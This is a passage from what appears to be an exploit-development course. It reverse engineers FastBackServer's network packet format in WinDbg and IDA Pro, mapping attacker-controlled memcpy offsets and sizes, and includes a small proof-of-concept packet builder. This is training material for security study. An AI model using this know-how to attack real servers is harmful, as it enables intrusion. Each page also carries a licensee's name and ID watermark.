“1”. 
Let’s validate this by moving execution in WinDbg to this function call, stepping over it, and 
checking the return value in EAX: 
eax=04ffa020 ebx=05ccc388 ecx=04ffa020 edx=04ffa020 esi=05ccc388 edi=00669360 
eip=00581618 esp=0df0feb8 ebp=0df0fec0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_GetData+0x52: 
00581618 e8b6020000      call    FastBackServer!FX_AGENT_CheckPacketIsComplete 
(005818d3) 
 
0:077> p 
eax=00000001 ebx=05ccc388 ecx=04ffa020 edx=04ffa020 esi=05ccc388 edi=00669360 
eip=0058161d esp=0df0feb8 ebp=0df0fec0 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FX_AGENT_GetData+0x57: 
0058161d 83c404          add     esp,4 
Listing 390 - Packet is complete and return value is TRUE 
As expected, EAX was set to “1”. Following the call to FX_AGENT_CheckPacketIsComplete, the 
return value is compared to “0”. This will not set the Zero flag and the subsequent JZ jump is not 
taken. 
Let’s examine the next basic block in Figure 94. 
 
Figure 94: Return value of FX_AGENT_GetData being set to 1 
Here, FX_AGENT_GetData completes its execution. Given the name of this function, we can 
assume that the application will next process the input data received. Once again, let’s continue 
execution until the return, and then step through it, as shown in Listing 391. 
0:077> pt 
eax=00000001 ebx=05ccc388 ecx=04ffa020 edx=04ffa020 esi=05ccc388 edi=00669360 
eip=00581635 esp=0df0fec4 ebp=0df0fef0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_GetData+0x6f: 
00581635 c3              ret 
 
0:077> p 
eax=00000001 ebx=05ccc388 ecx=04ffa020 edx=04ffa020 esi=05ccc388 edi=00669360 
eip=00581320 esp=0df0fec8 ebp=0df0fef0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
323 
FastBackServer!FX_AGENT_Cyclic+0xd0: 
00581320 83c404          add     esp,4 
Listing 391 - Returning from FX_AGENT_GetData into FX_AGENT_Cyclic 
As demonstrated in Listing 391, we have returned into the FX_AGENT_Cyclic function at offset 
0xD0. We can inspect the same code segment in IDA Pro: 
 
Figure 95: Return value validation in FX_AGENT_Cyclic 
After returning, there is a comparison between the return value of “1” and “0”, meaning the JZ will 
not be taken and execution will flow to the left basic block below, shown in Figure 95. 
Here, we find a comparison between a DWORD at offset 0x4438 from EDX and “0”. This static 
offset value rings a bell because it’s the same value that was used to store the checksum in the 
FX_AGENT_CopyReceiveBuff function we previously found. 
To ensure we are correct, let’s single-step until we reach the CMP instruction: 
eax=00000001 ebx=05ccc388 ecx=04ffa020 edx=04ffa020 esi=05ccc388 edi=00669360 
eip=0058132f esp=0df0fecc ebp=0df0fef0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_Cyclic+0xdf: 
0058132f 83ba3844000000  cmp     dword ptr [edx+4438h],0 ds:0023:04ffe458=00000064 
Listing 392 - Checking for 0 size payload 
Listing 392 shows that we were correct in our analysis, which means that the Zero flag is not set 
and the JNZ at 0x581336 (Figure 95) is going to be taken. Execution will continue to the basic 
block shown in Figure 96, which calls into the FXCLI_C_ReceiveCommand function. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
324 
 
Figure 96: Return value validation in FX_AGENT_Cyclic 
This interesting function name suggests that our input buffer will be used as part of some 
application functionality. 
Before we enter into the function, let’s review Figure 96 and observe the arguments being pushed 
to the stack. First is the static value “1”, followed by the DWORD at offset 0x4438, which is the 
checksum value. The last two arguments are harder to predict, so we’ll use dynamic analysis to 
dump them from the stack: 
eax=04ffa020 ebx=05ccc388 ecx=00000064 edx=04ffe45c esi=05ccc388 edi=00669360 
eip=00581361 esp=0df0febc ebp=0df0fef0 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FX_AGENT_Cyclic+0x111: 
00581361 e8898dfeff      call    FastBackServer!FXCLI_C_ReceiveCommand (0056a0ef) 
 
0:077> dd esp L4 
0df0febc  04ffa020 04ffe45c 00000064 00000001 
Listing 393 - Arguments for FXCLI_C_ReceiveCommand 
When we display the contents on the stack, we find the static value “1”, the checksum value 0x64, 
and two memory addresses. Let’s dump the data from those addresses. 
0:077> dd 04ffa020  
04ffa020  0096a318 0096a318 00000000 00000b10 
04ffa030  7ece0002 90b0a8c0 00000000 00000000 
04ffa040  00000068 00000000 00000000 00000000 
04ffa050  00000b14 00000001 64000000 41414141 
04ffa060  41414141 41414141 41414141 41414141 
04ffa070  41414141 41414141 41414141 41414141 
04ffa080  41414141 41414141 41414141 41414141 
04ffa090  41414141 41414141 41414141 41414141 
Listing 394 - First memory address 
The first address seems to contain the original packet we sent, along with its stored meta 
information. 
0:077> dd 04ffe45c  
04ffe45c  41414141 41414141 41414141 41414141 
04ffe46c  41414141 41414141 41414141 41414141 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
325 
04ffe47c  41414141 41414141 41414141 41414141 
04ffe48c  41414141 41414141 41414141 41414141 
04ffe49c  41414141 41414141 41414141 41414141 
04ffe4ac  41414141 41414141 41414141 41414141 
04ffe4bc  41414141 00000000 00000000 00000000 
04ffe4cc  00000000 00000000 00000000 00000000 
Listing 395 - Second memory address 
The second memory address seems to contain the input buffer after it is copied to the new 
memory location. 
This is promising, since the function will most likely use our data as input. Next, we need to move 
into the function and analyze what it does. 
Before analyzing the content of the function in detail, let’s examine it at a high level. The Graph 
overview of FXCLI_C_ReceiveCommand is shown in Figure 97. 
 
Figure 97: High level view of FXCLI_C_ReceiveCommand 
We can observe multiple branching statements, with the larger basic blocks continuing on the 
right of the layout. Each of these branching statements is a combination of a CMP instruction and 
a conditional jump. This kind of assembly code is typically generated from nested if and else 
statements in C code. A corresponding C level pseudocode example is found in Listing 396. 
if(condition 1) 
{ 
  if(condition 2) 
  { 
    if(condition 3) 
    { 
      if(condition 4) 
      { 
        if(condition 5) 
        { 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
326 
          Do something 
        } 
        else 
        { 
          Failure 5 
        } 
      } 
      else 
      { 
        Failure 4 
      } 
    } 
    else 
    { 
      Failure 3 
    } 
  } 
  else 
  { 
    Failure 2 
  } 
} 
else 
{ 
  Failure 1 
} 
Listing 396 - Nested C if statements 
We can deduce that any important application functionality will be found at the bottom-right side 
of the graph overview, and that anything else is a failure condition. This is confirmed by the basic 
blocks located at the bottom-left of the function at the addresses 0x056A1A8, 0x056A144, and 
0x056A11A, which contain error messages.    
We can now go back to first basic block of FXCLI_C_ReceiveCommand and start analyzing its 
code. In this block, we find a comparison between the third argument and the static value 0x30 as 
shown in Figure 98. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
327 
 
Figure 98: Comparison of third argument and 0x30 
We know it’s the third argument because of the arg_8 offset label in Figure 98. 
IDA Pro labels the function arguments using arg_0 for the first argument, arg_4 
for the second argument, arg_8 for the third argument, and so on. 
From our previous analysis, we know this will be the checksum value, so it will not be equal to 
0x30 and the JZ is not going to be taken in our case. 
The next basic block does an upper-bound check on the packet size by comparing the checksum 
value to 0x186A0, as shown in Figure 99. 
 
Figure 99: Upper-bounds check 
As long as our packet size is less than 0x186A0, we will trigger the JBE and proceed to the next 
basic block, which is what we want to do: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
328 
 
Figure 100: Call to destination buffer allocator 
After the JBE, the application performs a call to MEM_S_GetChunk as shown in Figure 100. We 
find that it does not accept any arguments we control. Since we don’t control any aspect of the 
call, we can make a guess that it is not important to reverse engineer. 
After the call, the return value is saved on the stack at the offset labeled Dst. Due to its name, we 
suspect that the MEM_S_GetChunk function is a memory allocator wrapper used here for the 
destination buffer. 
Let’s inspect the failure branch for this basic block: 
 
Figure 101: Failure statement after trying to allocate destination buffer 
In the above figure, we find the error command that will be printed by the application, but the IDA 
Pro window truncates it due to length. We can double-click on it to reach its address in memory 
and inspect it: 
 
Figure 102: Full error message 
The full error message solidifies our belief that MEM_S_GetChunk acts as an allocator. Based on 
this message, the newly-allocated buffer is named “psCommandBuffer”. To follow this better, we 
will use that term from now on. 
When we go back to the basic block calling MEM_S_GetChunk (Figure 103), we find a a 
comparison with “0” that checks if the psCommandBuffer was successfully allocated. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
329 
 
Figure 103: Call to MEM_S_GetChunk 
We have no reason to believe that it will fail, so the JNZ should be triggered, which leads us to the 
next basic block shown in Figure 104. 
 
Figure 104: Input buffer copy operation 
We find two API calls in this basic block: memset and memcpy. Memset286 is a common API that 
sets all bytes of a buffer to a specific value. In this case, psCommandBuffer will have all its bytes 
set to “0” and from the memset third argument, its size seems to be 0x186A4. 
This type of memory initialization is often used to remove any previous content 
in the buffer before it’s used. If initialization is not performed, it may be possible 
to exploit it in a vulnerability class called uninitialized memory use.287 
 
286 (cplusplus, 2020), http://www.cplusplus.com/reference/cstring/memset/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
330 
After the memory initialization, the memcpy API performs a copy operation. 
Moving forward in the analysis, we’ll be dealing with a lot of dereferences and arithmetic. Let’s 
switch to WinDbg and move the execution to the spot just before the memcpy call. From here, we 
can dump the memcpy arguments from the stack to understand what the application is going to 
copy and where: 
eax=00000034 ebx=05ccc388 ecx=04ffe48c edx=06facc0c esi=05ccc388 edi=00669360 
eip=0056a18a esp=0df0fe9c ebp=0df0feb4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_C_ReceiveCommand+0x9b: 
0056a18a e8b1cc0f00      call    FastBackServer!memcpy (00666e40) 
 
0:077> dd esp L3 
0df0fe9c  06facc0c 04ffe48c 00000034 
 
0:077> dd 04ffe48c-30 
04ffe45c  41414141 41414141 41414141 41414141 
04ffe46c  41414141 41414141 41414141 41414141 
04ffe47c  41414141 41414141 41414141 41414141 
04ffe48c  41414141 41414141 41414141 41414141 
04ffe49c  41414141 41414141 41414141 41414141 
04ffe4ac  41414141 41414141 41414141 41414141 
04ffe4bc  41414141 00000000 00000000 00000000 
04ffe4cc  00000000 00000000 00000000 00000000 
Listing 397 - Second and third arguments for memcpy 
From the first dd output and the two instructions starting at 0x056A16B in Figure 104 (mov eax, 
[ebp+arg_8], sub eax, 30h), we find that the size parameter is our checksum value (0x64) minus 
the static value of 0x30. From the second argument, we find that the source buffer is our input 
buffer starting at offset 0x30. This use of a static offset into the buffer typically indicates a 
separation between a header and content data. 
At this point, we can assume that our packet has the structure shown in Listing 398. 
0x00 - 0x04: Checksum DWORD 
0x04 - 0x34: Packet header 
0x34 - End:  psCommandBuffer 
Listing 398 - Initial structure of packet 
In the next basic block (Figure 105), we find another call to MEM_S_GetChunk, which was the 
allocator used for psCommandBuffer. Once again, we do not control the allocation size so we can 
skip stepping into the call. 
 
287 (Halvar Flake, 2006), https://www.blackhat.com/presentations/bh-europe-06/bh-eu-06-Flake.pdf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
331 
 
Figure 105: Second allocation operation 
This time, if MEM_S_GetChunk fails, we end up reaching another failure block with the error 
message shown in Figure 106. 
 
Figure 106: Full error message for the second allocation 
From the allocation failure message, we discover that this buffer is named “psAgentCommand”. 
If the allocation succeeds, this new buffer is used in the next basic block where we find another 
copy operation through memcpy, as shown in Figure 107. 
 
Figure 107: Copy operation for the psAgentCommand buffer 
From the highlighted lines of Figure 107, we find the size of the copy operation is 0x30 bytes, 
which matches our estimate of the packet header size. Our theory is further confirmed because 
the memory copy starts at the beginning of our input buffer (move eax, [ebp+Src], push eax in the 
figure above). 
Let’s update the packet structure with these new buffer names: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
332 
0x00 - 0x04: Checksum DWORD 
0x04 - 0x34: psAgentCommand 
0x34 - End:  psCommandBuffer 
Listing 399 - Updated structure of packet 
In Figure 107, a call to MSGQ_S_GetChunkForMessage is issued after the mempy operation. This 
function does not accept any arguments under our control, so we can skip it for now. 
The next basic block contains a call to the FXCLI_OraBR_Exec_Command function (Figure 108). 
This function name definitely seems interesting. 
 
Figure 108: Call to FXCLI_OraBR_Exec_Command 
Developers commonly use function names that hint to their purpose. This can 
help us greatly in our reverse engineering process. Unfortunately, function names 
are often not present during the analysis, increasing our reverse engineering 
effort. 
In this section, we reverse engineered the protocol used for the network packet to obtain three 
distinct buffer elements, including two new elements called psAgentCommand and 
psCommandBuffer. We were also able to reach a function that we believe will execute application 
functions based on our input data. 
In the next section, we will analyze the FXCLI_OraBR_Exec_Command function. 
8.3.1.1 Exercise 
1. 
Use a combination of static and dynamic analysis to obtain the same results demonstrated 
in this section. Focus on identifying the packet structure and names. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
333 
8.3.2 Reversing the Header 
In this section, we’ll analyze the FXCLI_OraBR_Exec_Command function. We will leverage this 
function in the next sections to locate vulnerabilities, so it’s important to understand it thoroughly. 
When we attempt to examine this function in IDA Pro, we are met with the following error 
message: 
 
Figure 109: Error message in IDA Pro when entering FXCLI_OraBR_Exec_Command 
We receive this error because, by default, IDA Pro will only display functions in graph mode with a 
maximum 
of 
1000 
basic 
blocks 
or 
nodes. 
We 
will 
soon 
find 
out 
that 
FXCLI_OraBR_Exec_Command is a very large function. 
Let’s increase the maximum number of nodes per function. We can navigate to Options > General 
and the Graph tab to change the Max number of nodes to 10000, as shown in Figure 110. 
 
Figure 110: Changing the maximum number of nodes in Ida Pro 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
334 
 
With the maximum number of nodes increased, we’ll click OK and press T to switch back to 
graph view. The Graph overview window gives us a hint at how massive this function is: 
 
Figure 111: Graph overview for FXCLI_OraBR_Exec_Command 
Before we dig into the function, let’s use the graph overview shown in Figure 111 to understand 
the high-level application logic. 
Functions like FXCLI_OraBR_Exec_Command are written through a multitude of if, else, and 
switch288 statements. The evaluation of these conditional statements is commonly based on 
single or multiple values usually stored in the packet header. These values are often referred to 
opcodes. 
Generally, when we’re reverse engineering to locate vulnerabilities, functions with 
a huge amount of branches like FXCLI_OraBR_Exec_Command are the ones we 
want to locate and trigger from our network packet, as they provide us with 
multiple code paths to explore. 
First, we want to reverse engineer the top part of the function to gain a better understanding of 
how the psAgentCommand and psCommandBuffer buffers are used. 
To easily trace our input inside the function, we’ll update our PoC so that the psAgentCommand 
section consists of 0x41 bytes and the psCommandBuffer section consists of 0x42 bytes, as 
partially-displayed in Listing 400.  
... 
buf = pack(">i", 0x64) 
buf += bytearray([0x41]*0x30) 
buf += bytearray([0x42]*0x34) 
... 
Listing 400 - Updated proof of concept with different values 
Next, we will remove any existing breakpoints, set a breakpoint on FXCLI_OraBR_Exec_Command, 
and send a new packet using our updated PoC: 
 
288 (TutorialsPoint, 2020), https://www.tutorialspoint.com/cprogramming/switch_statement_in_c.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
335 
0:077> bc * 
 
0:077> bp FastBackServer!FXCLI_OraBR_Exec_Command 
 
0:077> g 
Breakpoint 0 hit 
eax=0d42b020 ebx=062faef0 ecx=06302990 edx=062fc880 esi=062faef0 edi=00669360 
eip=0056c4b6 esp=0d73fe9c ebp=0d73feb4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command: 
0056c4b6 55              push    ebp 
Listing 401 - Initial breakpoint inside FXCLI_OraBR_Exec_Command 
The prologue of FXCLI_OraBR_Exec_Command is very large, but if we continue to single step 
through instructions, we will eventually reach a comparison using a DWORD from the 
psAgentCommand header: 
eax=062fc890 ebx=062faef0 ecx=062fc880 edx=072b4c0c esi=062faef0 edi=00669360 
eip=0056c82b esp=0d6de334 ebp=0d73fe98 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x375: 
0056c82b 817804a8610000  cmp     dword ptr [eax+4],61A8h ds:0023:062fc894=41414141 
 
0:064> dd eax-20 L10 
062fc870  00000000 00000000 00000000 00000000 
062fc880  41414141 41414141 0d42b020 41414141 
062fc890  41414141 41414141 41414141 41414141 
062fc8a0  41414141 41414141 41414141 072b4c08 
Listing 402 - Comparison of DWORD in psAgentCommand 
We know that this is the psAgentCommand buffer because it has our 0x41 bytes. We can also 
observe that the comparison (cmp dword ptr [eax+4],61A8h) is performed at an offset of 4 from 
the EAX register, which points to 0x062fc890 in the listing above. 
Since the bottom part of the listing shows that psAgentCommand starts at 0x062fc880, we can 
deduce that the DWORD compared with the static value 61A8h is located at offset 0x14 from the 
beginning of the psAgentCommand buffer. 
Before moving forward, we’ll notice that the content of ECX originates from EBP+var_C370, as 
shown in Figure 112. 
 
Figure 112: Storage address of psAgentCommand 
From the output shown in Listing 402, we learn that EBP+var_C370 contains the address of the 
psAgentCommand buffer and that EBP+var_61B4 contains the address of the psAgentCommand 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
336 
buffer plus 0x10 bytes. To ease our reverse engineering, let’s rename the var_C370 to 
“psAgentCommand” and var_61B4 to “psAgentCommand_0x10”. 
Using IDA Pro, we find that if the subsequent JNB is triggered, the execution leads to a failure 
statement with the message shown in Figure 113. This indicates that this DWORD must be less 
than or equal to 0x61A8. 
 
Figure 113: Error message from large size value 
We can speed up our reverse engineering process by modifying the compared DWORD in 
memory to avoid the failure statement. 
Let’s use the ed command to change the DWORD to 0x1000, an arbitrary value smaller than 
0x61A8. When the comparison is performed, the conditional jump is not taken. 
0:064> ed eax+4 1000 
 
0:064> r 
eax=062fc890 ebx=062faef0 ecx=062fc880 edx=072b4c0c esi=062faef0 edi=00669360 
eip=0056c82b esp=0d6de334 ebp=0d73fe98 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x375: 
0056c82b 817804a8610000  cmp     dword ptr [eax+4],61A8h ds:0023:062fc894=00001000 
 
0:064> p 
eax=062fc890 ebx=062faef0 ecx=062fc880 edx=072b4c0c esi=062faef0 edi=00669360 
eip=0056c832 esp=0d6de334 ebp=0d73fe98 iopl=0         nv up ei ng nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293 
FastBackServer!FXCLI_OraBR_Exec_Command+0x37c: 
0056c832 731e            jae     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c 
(0056c852) [br=0] 
Listing 403 - Modifying the DWORD at offset 0x14 
This kind of comparison between a DWORD in the buffer sent over the network and a static value, 
combined with the error message, suggests that we are dealing with a length or size parameter. 
The comparison also indicates that 0x61A8 is the upper limit for this parameter. 
When we single-step to the next basic block, we find the comparison shown in Figure 114. 
 
Figure 114: Comparison of DWORD at offset 0x0C 
The DWORD at the offset 0xC from ECX, which is at offset 0x1C in the psAgentCommand buffer, 
must also be less than or equal to 0x61A8. This indicates yet another upper bound check. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
337 
If we do not trigger the following conditional jump, we arrive at a third, similar check in a different 
basic block, shown in Figure 115. 
 
Figure 115: Comparison of DWORD at offset 0x4C 
This third comparison shown above is equal to the first one we encountered. It occurs between 
the DWORD at offset 0x14 from the beginning of the psAgentCommand buffer and the static 
value 0x61A8. Since we have changed that value in memory already, we do not have to take 
further actions for this check. 
The only thing we need to do to continue execution without resetting our session and updating 
our PoC is to manually set the DWORD at offset 0x1C to an arbitrary value below 0x61A8. In this 
case, we choose 0x2000 and, as shown in the listing below, execution continues past the last two 
comparisons: 
0:064> ed ecx+c 2000 
 
0:064> r 
eax=062fc890 ebx=062faef0 ecx=062fc890 edx=072b4c0c esi=062faef0 edi=00669360 
eip=0056c83a esp=0d6de334 ebp=0d73fe98 iopl=0         nv up ei ng nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293 
FastBackServer!FXCLI_OraBR_Exec_Command+0x384: 
0056c83a 81790ca8610000  cmp     dword ptr [ecx+0Ch],61A8h ds:0023:062fc89c=00002000 
 
0:064> p 
eax=062fc890 ebx=062faef0 ecx=062fc890 edx=072b4c0c esi=062faef0 edi=00669360 
eip=0056c841 esp=0d6de334 ebp=0d73fe98 iopl=0         nv up ei ng nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293 
FastBackServer!FXCLI_OraBR_Exec_Command+0x38b: 
0056c841 730f            jae     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c 
(0056c852) [br=0] 
 
0:064>  
eax=062fc890 ebx=062faef0 ecx=062fc890 edx=072b4c0c esi=062faef0 edi=00669360 
eip=0056c843 esp=0d6de334 ebp=0d73fe98 iopl=0         nv up ei ng nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293 
FastBackServer!FXCLI_OraBR_Exec_Command+0x38d: 
0056c843 8b954c9effff    mov     edx,dword ptr [ebp-61B4h] ss:0023:0d739ce4=062fc890 
 
0:064>  
eax=062fc890 ebx=062faef0 ecx=062fc890 edx=062fc890 esi=062faef0 edi=00669360 
eip=0056c849 esp=0d6de334 ebp=0d73fe98 iopl=0         nv up ei ng nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293 
FastBackServer!FXCLI_OraBR_Exec_Command+0x393: 
0056c849 817a04a8610000  cmp     dword ptr [edx+4],61A8h ds:0023:062fc894=00001000 
 
0:064>  
eax=062fc890 ebx=062faef0 ecx=062fc890 edx=062fc890 esi=062faef0 edi=00669360 
eip=0056c850 esp=0d6de334 ebp=0d73fe98 iopl=0         nv up ei ng nz ac po cy 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
338 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293 
FastBackServer!FXCLI_OraBR_Exec_Command+0x39a: 
0056c850 7273            jb      FastBackServer!FXCLI_OraBR_Exec_Command+0x40f 
(0056c8c5) [br=1] 
Listing 404 - Modifying DWORD at offset 0x1C and navigating jumps 
The last jump shown in the listing above is the Jump below (JB)289 presented in Figure 115 and is 
going to take us to loc_56C8C5 in IDA Pro (Figure 116) since our value (0x1000) is smaller than 
0x61A8. 
 
Figure 116: First copy operation on psCommandBuffer 
Let’s resume our work in IDA Pro from that location. Figure 116 shows the first of three similar 
copy operations using memcpy that we need to understand. 
In the top block, we find a comparison between the DWORD we modified at offset 0x14 from the 
beginning of psAgentCommand and “0”. Since we set this to 0x1000 we are going to pass this 
check and reach the next basic block where, at the top, we observe that this same value is copied 
to ECX and used as the Size parameter for the memcpy operation. 
When C/C++ code is compiled into assembly, ECX is commonly used as a 
counter in string operations. 
 
289 (Intel Pentium Instruction Set Reference (Basic Architecture Overview), http://faydoc.tripod.com/cpu/jb.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
339 
Highlighted in the lower part of Figure 116, the source buffer parameter is a bit more complicated, 
so we’ll analyze it dynamically in the debugger. We can step through the code to observe the 
following: 
eax=062fc890 ebx=062faef0 ecx=00001000 edx=062fc890 esi=062faef0 edi=00669360 
eip=0056c8e1 esp=0d6de330 ebp=0d73fe98 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x42b: 
0056c8e1 8b85509effff    mov     eax,dword ptr [ebp-61B0h] ss:0023:0d739ce8=072b4c0c 
 
0:064> p 
eax=072b4c0c ebx=062faef0 ecx=00001000 edx=062fc890 esi=062faef0 edi=00669360 
eip=0056c8e7 esp=0d6de330 ebp=0d73fe98 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x431: 
0056c8e7 0302            add     eax,dword ptr [edx]  ds:0023:062fc890=41414141 
 
0:064> dd eax 
072b4c0c  42424242 42424242 42424242 42424242 
072b4c1c  42424242 42424242 42424242 42424242 
072b4c2c  42424242 42424242 42424242 42424242 
072b4c3c  42424242 00000000 00000000 00000000 
072b4c4c  00000000 00000000 00000000 00000000 
072b4c5c  00000000 00000000 00000000 00000000 
072b4c6c  00000000 00000000 00000000 00000000 
072b4c7c  00000000 00000000 00000000 00000000 
 
0:064> dd edx LC 
062fc890  41414141 00001000 41414141 00002000 
062fc8a0  41414141 41414141 41414141 072b4c08 
062fc8b0  26b3980f 081d037f 4c435846 534d5f49 
Listing 405 - Source buffer at an offset from psCommandBuffer 
Listing 405 shows us two important things. First, EAX contains the address of psCommandBuffer, 
our 0x42’s. This means that the copy operation will use our input data. The address of 
psCommandBuffer is stored in the variable var_61B0, so we can rename that to 
“psCommandBuffer” inside IDA Pro. 
Second, we can observe the addition operation between the address stored in EAX 
(psCommandBuffer address) and the value EDX points to. This in effect modifies the starting 
address within psCommandBuffer for the copy operation. By inspecting the content memory 
pointed to by EDX, highlighted at the end of Listing 405, we find that this DWORD is located at 
offset 0x10 from the beginning of our psAgentCommand buffer and therefore is under our control. 
Putting these two findings together, we learn that the copy operation is performed on our input 
data at an offset we control. Let’s use this to update our packet structure: 
0x00       : Checksum DWORD 
0x04 - 0x30: psAgentCommand 
  - 0x04 - 0x10:  ?? 
  - 0x14:         Offset for copy operation 
  - 0x18:         Size of copy operation 
  - 0x1C - 0x30:  ?? 
0x34 - End:  psCommandBuffer 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
340 
Listing 406 - Updated structure of packet 
Although we have learned a lot, there are still quite a few bytes that we do not understand in the 
psAgentCommand buffer. Let’s try to gather some more information with IDA Pro. 
Moving forward, we’ll uncover a basic block at address 0x0056C916 where another memcpy 
operation is performed, as displayed in Figure 117. 
 
Figure 117: Second copy operation on psCommandBuffer 
The start of the copy into the source buffer is controlled by a value found at offset 0x18 from the 
beginning of the psAgentCommand buffer. The size of the copy is still under our control, located 
at offset 0x1C in the header. 
At address 0x0056C95C, we find yet another similar basic block containing a memcpy operation, 
as given in Figure 118. 
 
Figure 118: Third copy operation on psCommandBuffer 
Our psCommandBuffer is again used as the source buffer. In this case, the start of the copy is 
controlled by a value found at offset 0x20 from the beginning of the psAgentCommand buffer. 
The size of the copy is found at offset 0x24 in the header. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
341 
An updated packet structure based on this information is shown in Listing 407. 
0x00       : Checksum DWORD 
0x04 - 0x30: psAgentCommand 
  - 0x04 - 0x10:  ?? 
  - 0x14:         Offset for 1st copy operation 
  - 0x18:         Size of 1st copy operation 
  - 0x1C:         Offset for 2nd copy operation 
  - 0x20:         Size of 2nd copy operation 
  - 0x24:         Offset for 3rd copy operation 
  - 0x28:         Size of 3rd copy operation 
  - 0x2C - 0x30:  ?? 
0x34 - End:  psCommandBuffer 
Listing 407 - Updated structure of packet 
Next, we’ll go back to WinDbg to inspect execution of the first memcpy operation, as shown in 
Listing 408: 
eax=486c8d4d ebx=062faef0 ecx=0d733b30 edx=062fc890 esi=062faef0 edi=00669360 
eip=0056c8f1 esp=0d6de328 ebp=0d73fe98 iopl=0         nv up ei pl nz na pe nc 
